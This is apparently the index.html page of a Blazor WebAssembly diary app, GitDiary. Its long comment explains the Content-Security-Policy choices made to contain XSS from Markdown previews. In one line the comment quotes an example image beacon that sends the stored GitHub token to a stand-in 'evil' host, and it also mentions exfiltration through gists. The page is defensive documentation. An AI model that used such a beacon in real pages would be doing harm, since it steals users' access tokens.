<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="referrer" content="strict-origin-when-cross-origin" />
    <!--
        Content-Security-Policy (defense-in-depth against Markdown-preview XSS).

        The PAT lives in localStorage, so ANY script execution on this origin is a
        full compromise of the user's diary repo. Two properties matter here, and
        both were broken until the 2026-07 hardening pass:

          * script-src has NO 'unsafe-inline'. An injected <script> or inline event
            handler therefore does not execute at all. This is the layer that
            actually contains an XSS; everything else only limits the damage after
            code is already running. The cost is that every inline script must be
            externalized (see js/theme-boot.js, js/sw-register.js) — EXCEPT the
            import map, which Blazor generates inline at publish time with content
            that changes whenever an asset fingerprint changes. It is allowed by a
            sha256 hash that CI recomputes on every deploy (see
            .github/workflows/deploy.yml → "Pin import-map CSP hash"). Do not add a
            new inline <script> to this file: it will be blocked at runtime.

          * img-src does NOT include a bare `https:`. That wildcard silently
            defeated the connect-src restriction below, because an image beacon
            (`new Image().src = 'https://evil/?t=' + localStorage.gitdiary_token`)
            is governed by img-src, not connect-src. Remote images in diary entries
            are limited to GitHub's own asset hosts, which is where GitDiary's own
            attachments live.

        connect-src pins fetch/XHR to same-origin + api.github.com. Note this can
        never fully contain a *stolen GitHub PAT* (an attacker with the token could
        exfiltrate through api.github.com itself, e.g. by creating a gist) — which
        is exactly why the script-src property above is the one that matters.

        'wasm-unsafe-eval' is required by the WASM runtime. style-src keeps
        'unsafe-inline' because Blazor injects scoped styles at runtime; that is an
        accepted, far lower-value gap (CSS cannot read localStorage).

        Note: frame-ancestors is intentionally omitted — it is ignored in <meta>
        CSPs by every browser and must be supplied via HTTP headers instead.
    -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.githubusercontent.com; font-src 'self' data:; connect-src 'self' https://api.github.com; manifest-src 'self'; worker-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'" />
    <title>GitDiary</title>
    <base href="/" />
    <link rel="preload" id="webassembly" />
    <link rel="stylesheet" href="css/app.css" />
    <link rel="icon" type="image/svg+xml" href="favicon.svg" />
    <link rel="apple-touch-icon" href="favicon.svg" />
    <link rel="manifest" href="manifest.webmanifest" />
    <meta name="theme-color" content="#7c6fff" />
    <link href="GitDiary.Client.styles.css" rel="stylesheet" />
    <script type="importmap"></script>
    <!-- Theme/skin boot + JS interop bridges. External (not inline) so the CSP can
         drop script-src 'unsafe-inline'. Must stay render-blocking in <head>: it
         sets html.dataset.mode/skin before first paint to avoid a theme flash. -->
    <script src="js/theme-boot.js"></script>
</head>

<body>
    <div id="app">
        <svg class="loading-progress">
            <circle r="40%" cx="50%" cy="50%" />
            <circle r="40%" cx="50%" cy="50%" />
        </svg>
        <div class="loading-progress-text"></div>
    </div>

    <div id="blazor-error-ui">
        An unhandled error has occurred.
        <a href="." class="reload">Reload</a>
        <span class="dismiss">🗙</span>
    </div>
    <script src="js/preview-interop.js"></script>
    <script src="js/mermaid-interop.js"></script>
    <script src="_framework/blazor.webassembly#[.{fingerprint}].js"></script>
    <script src="js/sw-register.js"></script>
</body>

</html>
